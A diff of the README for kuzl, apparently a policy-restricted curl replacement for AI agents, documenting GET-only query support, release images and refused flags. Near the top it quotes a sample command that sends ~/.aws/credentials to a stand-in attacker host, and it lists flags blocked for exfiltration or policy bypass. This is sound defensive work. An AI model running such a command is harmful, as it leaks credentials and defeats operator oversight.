@@ -11,9 +11,11 @@ is allowed, `curl -d @~/.aws/credentials https://evil.example` reads a file
 and sends it out in one call.
 
 The design and roadmap live in
-[#1](https://github.com/evadcmd/kuzl/issues/1). Steps 1 to 4 are in: the
+[#1](https://github.com/evadcmd/kuzl/issues/1). Its steps 1 to 6 are in: the
 skeleton, the network policy (`internal/netguard`), `curl` for GET and HEAD,
-and files and ranges (`-o`, `-O`, `-r`, `-w`).
+files and ranges (`-o`, `-O`, `-r`, `-w`), query strings (`-G` with `-d` and
+`--data-urlencode`), and the release image. What is left is on taruza's side:
+installing it and allowing `Bash(curl:*)`.
 
 ## curl
 
@@ -24,20 +26,22 @@ curl [flags] <url>
 The flags are curl's: `-s`, `-S`, `-f`, `--fail-with-body`, `-L`,
 `--max-redirs`, `-I`, `-i`, `-X GET|HEAD`, `-H`, `-A`, `-e`, `-m`,
 `--connect-timeout`, `--compressed`, `-o`, `-O`, `--create-dirs`,
-`--max-filesize`, `-r` and `-w`. Errors are curl's `curl: (N) message` with
-curl's exit code: 3 for a malformed URL, 6 when the host doesn't resolve, 7
-when it can't be reached, 22 for `-f` on a status of 400 or more, 23 when the
-output can't be written, 28 on a timeout, 47 past `--max-redirs` and 63 past
-`--max-filesize`.
+`--max-filesize`, `-r`, `-w`, and with `-G`, `-d`, `--data-ascii`,
+`--data-binary`, `--data-raw` and `--data-urlencode`. Errors are curl's
+`curl: (N) message` with curl's exit code: 3 for a malformed URL, 6 when the
+host doesn't resolve, 7 when it can't be reached, 22 for `-f` on a status of
+400 or more, 23 when the output can't be written, 28 on a timeout, 47 past
+`--max-redirs` and 63 past `--max-filesize`.
 
 Where kuzl differs:
 
 - Anything kuzl doesn't do exits 2 with the reason on one line, before
-  anything is sent, even under `-s`: flags that send data (`-d`, `--json`,
-  `-F`, `-T`), read or write local files (`-K`, `-b`, `-c`, `--netrc`, `-H
-  @file`) or go around the policy (`-x`, `-k`, `--unix-socket`, `--resolve`,
-  `--connect-to`, `--location-trusted`), `-u`, a `Host` header, a method
-  other than GET or HEAD, and a request the policy refuses.
+  anything is sent, even under `-s`: flags that send data (`--json`, `-F`,
+  `-T`, and `-d` without `-G`), read or write local files (`-K`, `-b`, `-c`,
+  `--netrc`, `-H @file`, `-d @file`) or go around the policy (`-x`, `-k`,
+  `--unix-socket`, `--resolve`, `--connect-to`, `--location-trusted`), `-u`,
+  a `Host` header, a method other than GET or HEAD, and a request the policy
+  refuses.
 - Stdout gets at most 100000 bytes, headers included, cut on a character
   boundary, with a note on stderr of how much was left out. A body that isn't
   UTF-8 text is not written to stdout and exits 23. The note points at `-o`.
@@ -54,14 +58,46 @@ Where kuzl differs:
   `%{size_download}`; any other variable is a usage error, and `-w @file` is
   refused. It is written after HTTP and transfer errors, as curl does, but
   not after a refusal.
+- `-d` and its variants are taken only with `-G`, which adds them to the
+  URL's query string, joined with `&` in the command line's order, as curl
+  does. A value is never read from a file: `-d @file` is refused, and so is
+  `--data-urlencode` with an `@` but no `=` (`@file`, `name@file`);
+  `--data-raw` sends `@` as is. `--data-urlencode` encodes as curl does, a
+  space as `%20`. `-d` is sent as given, except that bytes a query can't hold,
+  such as a space, `#`, control characters and non-ASCII, are percent-encoded.
 - One URL per call. `-i` and `-I` print the headers sorted, in Go's
   canonical case, not in the server's order.
 - The default `User-Agent` is `kuzl/<version>`; `-A` sets another.
 
+## Releasing
+
+Pushing a `v*` tag builds an image holding only the binary, for
+`linux/amd64` and `linux/arm64`, and pushes it to
+`ghcr.io/evadcmd/kuzl:<tag>` (`.github/workflows/release.yml`). The binary
+has [`policy.yaml`](policy.yaml) as of the tag built in, and the tag as its
+version. Other images copy it out and symlink it as `curl`:
+
+```dockerfile
+COPY --from=ghcr.io/evadcmd/kuzl:v0.1.0 /kuzl /usr/local/bin/kuzl
+RUN ln -s kuzl /usr/local/bin/curl
+```
+
+Put it where the real `curl` isn't, or isn't found first on the agent's
+`PATH`: kuzl only helps if the real one can't be run.
+
+The image build checks the policy as `make build` does. To try an unreleased
+build, or one with another policy (a file in the build context), build the
+image locally and copy from that tag instead:
+
+```sh
+docker build -t kuzl:dev .
+docker build -t kuzl:dev --build-arg POLICY=other.yaml --build-arg VERSION=dev .
+```
+
 ## Testing locally
 
 ```sh
-make build   # builds policy.yaml in; POLICY=other.yaml for another, POLICY= for none
+make build   # builds policy.yaml in; POLICY=other.yaml for another
 bin/kuzl policy
 bin/kuzl curl --help
 ```
@@ -86,8 +122,9 @@ in instead. The keys:
   name resolves to.
 
 Every key may be left out. A host not in `allow_hosts` is refused, so with
-`allow_hosts` left out, empty or null, and with no policy built in
-(`POLICY=`), every host is. An unknown key, a value of the wrong type or an
+`allow_hosts` left out, empty or null, every host is. So is it in a binary
+with no policy built in, such as a plain `go build`'s; `make build` and the
+image build refuse an empty `POLICY` for that reason. An unknown key, a value of the wrong type or an
 invalid entry is an error, reported with its line, rather than skipped.
 `make build` runs `bin/kuzl policy`, which prints the policy as kuzl reads
 it, and fails the build if it doesn't validate.
@@ -114,7 +151,7 @@ they never reach another origin. See
 
 ### Environment
 
-- `KUZL_ROOT`: the directory `-o` (step 4) writes are confined to. Defaults
+- `KUZL_ROOT`: the directory `-o` and `-O` writes are confined to. Defaults
   to the working directory.
 - Telemetry stays off unless an OTLP endpoint is set
   (`OTEL_EXPORTER_OTLP_ENDPOINT` or `OTEL_EXPORTER_OTLP_LOGS_ENDPOINT`).
